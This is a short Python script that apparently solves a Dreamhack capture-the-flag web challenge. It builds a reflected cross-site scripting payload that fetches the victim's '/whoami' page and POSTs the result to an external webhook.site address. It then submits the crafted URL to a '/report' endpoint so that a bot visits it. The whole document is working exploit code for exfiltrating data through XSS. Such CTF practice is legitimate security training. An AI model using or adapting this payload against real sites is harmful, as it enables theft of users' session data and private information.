import requests
from urllib.parse import quote

HOST = "http://host3.dreamhack.games:12709"
WEBHOOK = "https://6f1484e6-fb9f-436b-8ef8-ddbcaa00024c.webhook.site"

payload = f"""
<script>
fetch('/whoami')
  .then(r => r.text())
  .then(data => {{
    fetch('{WEBHOOK}', {{
      method: 'POST',
      mode: 'no-cors',
      headers: {{ 'Content-Type': 'text/plain' }},
      body: data
    }});
  }});
</script>
"""

def solve():
    malicious_url = f"{HOST}/intro?name={quote(payload)}&detail=detail"
    res = requests.post(f"{HOST}/report", data={"path": malicious_url})
    print(f"Status: {res.status_code}")
    print(f"Response: {res.text}")

if __name__ == "__main__":
    solve()